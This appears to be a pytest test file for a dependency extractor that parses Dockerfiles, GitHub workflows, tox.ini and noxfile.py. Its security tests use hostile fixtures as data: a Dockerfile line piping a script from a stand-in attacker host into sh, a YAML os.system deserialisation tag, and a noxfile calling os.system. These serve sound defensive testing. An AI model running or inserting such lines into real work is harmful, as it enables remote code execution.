"""Skeleton tests for REQ-2c — Container & CI Dependency Extractor."""
from __future__ import annotations

import textwrap

import pytest

from scarno.analysers.python.dep_file_parser import parse_all_dependency_files


class TestDockerfile:
    @pytest.mark.requirement("FR-050")
    def test_simple_pip_install_extracted(self, tmp_path):
        (tmp_path / "Dockerfile").write_text(
            "FROM python:3.12\nRUN pip install requests==2.31.0 flask\n"
        )
        deps, _, _ = parse_all_dependency_files(str(tmp_path))
        names = [d.name for d in deps]
        assert "requests" in names
        assert "flask" in names

    @pytest.mark.requirement("FR-050")
    def test_source_provenance_set_to_dockerfile(self, tmp_path):
        (tmp_path / "Dockerfile").write_text("RUN pip install requests\n")
        deps, _, _ = parse_all_dependency_files(str(tmp_path))
        req = next((d for d in deps if d.name == "requests"), None)
        assert req is not None
        assert req.source == "Dockerfile"

    @pytest.mark.requirement("FR-050")
    def test_multiline_run_with_continuation(self, tmp_path):
        (tmp_path / "Dockerfile").write_text(
            "RUN pip install \\\n    requests \\\n    flask \\\n    pytest\n"
        )
        deps, _, _ = parse_all_dependency_files(str(tmp_path))
        names = [d.name for d in deps]
        assert {"requests", "flask", "pytest"}.issubset(names)

    @pytest.mark.requirement("FR-050")
    @pytest.mark.requirement("SEC-NEW-16")
    @pytest.mark.security
    def test_dockerfile_redos_does_not_hang(self, tmp_path):
        """Crafted Dockerfile with a very long line must not trigger ReDoS."""
        import time

        (tmp_path / "Dockerfile").write_text("RUN pip install " + "a" * 200_000 + "\n")
        start = time.monotonic()
        parse_all_dependency_files(str(tmp_path))
        elapsed = time.monotonic() - start
        assert elapsed < 2.0

    @pytest.mark.requirement("FR-050")
    @pytest.mark.requirement("SF-005")
    @pytest.mark.security
    def test_curl_pipe_shell_emits_finding(self, tmp_path):
        (tmp_path / "Dockerfile").write_text(
            "RUN curl https://evil.example.com/install.sh | sh\n"
        )
        deps, _, _ = parse_all_dependency_files(str(tmp_path))
        # Finding surfaces via REQ-3c; this skeleton test simply verifies no
        # fake package was added
        assert all("evil.example.com" not in d.name for d in deps)


class TestGitHubWorkflows:
    @pytest.mark.requirement("FR-051")
    def test_workflow_run_pip_install_extracted(self, tmp_path):
        workflows = tmp_path / ".github" / "workflows"
        workflows.mkdir(parents=True)
        (workflows / "ci.yml").write_text(
            textwrap.dedent(
                """\
            name: ci
            on: [push]
            jobs:
              test:
                runs-on: ubuntu-latest
                steps:
                  - run: pip install pytest coverage
            """
            )
        )
        deps, _, _ = parse_all_dependency_files(str(tmp_path))
        names = [d.name for d in deps]
        assert "pytest" in names
        assert "coverage" in names

    @pytest.mark.requirement("FR-051")
    @pytest.mark.requirement("SEC-NEW-15")
    @pytest.mark.security
    def test_workflow_uses_safe_load(self, tmp_path):
        workflows = tmp_path / ".github" / "workflows"
        workflows.mkdir(parents=True)
        (workflows / "ci.yml").write_text(
            "!!python/object/apply:os.system ['echo pwned']\n"
        )
        # Must not execute the tag
        parse_all_dependency_files(str(tmp_path))


class TestToxIni:
    @pytest.mark.requirement("FR-052")
    def test_tox_testenv_deps_extracted(self, tmp_path):
        (tmp_path / "tox.ini").write_text(
            textwrap.dedent(
                """\
            [testenv]
            deps =
                pytest
                coverage
            """
            )
        )
        deps, _, _ = parse_all_dependency_files(str(tmp_path))
        names = [d.name for d in deps]
        assert {"pytest", "coverage"}.issubset(names)

    @pytest.mark.requirement("FR-052")
    @pytest.mark.requirement("SEC-NEW-17")
    @pytest.mark.security
    def test_tox_interpolation_cycle_detected(self, tmp_path):
        (tmp_path / "tox.ini").write_text(
            textwrap.dedent(
                """\
            [a]
            deps = {[b]deps}
            [b]
            deps = {[a]deps}
            [testenv]
            deps = {[a]deps}
            """
            )
        )
        deps, errors, _ = parse_all_dependency_files(str(tmp_path))
        assert any(
            "cycle" in e.lower() or "interpolation" in e.lower() for e in errors
        )


class TestNoxfile:
    @pytest.mark.requirement("FR-053")
    def test_session_install_extracted(self, tmp_path):
        (tmp_path / "noxfile.py").write_text(
            textwrap.dedent(
                """\
            import nox

            @nox.session
            def lint(session):
                session.install("black", "ruff")
            """
            )
        )
        deps, _, _ = parse_all_dependency_files(str(tmp_path))
        names = [d.name for d in deps]
        assert "black" in names
        assert "ruff" in names

    @pytest.mark.requirement("FR-053")
    @pytest.mark.requirement("SEC-NEW-18")
    @pytest.mark.requirement("SEC-001")
    @pytest.mark.security
    def test_noxfile_is_ast_only_never_executed(self, tmp_path):
        """A malicious noxfile.py must not be executed during parsing."""
        import os

        (tmp_path / "noxfile.py").write_text(
            textwrap.dedent(
                """\
            import os
            os.system("touch /tmp/scarno_executed_noxfile")
            import nox

            @nox.session
            def lint(session):
                session.install("black")
            """
            )
        )
        parse_all_dependency_files(str(tmp_path))
        assert not os.path.exists("/tmp/scarno_executed_noxfile")
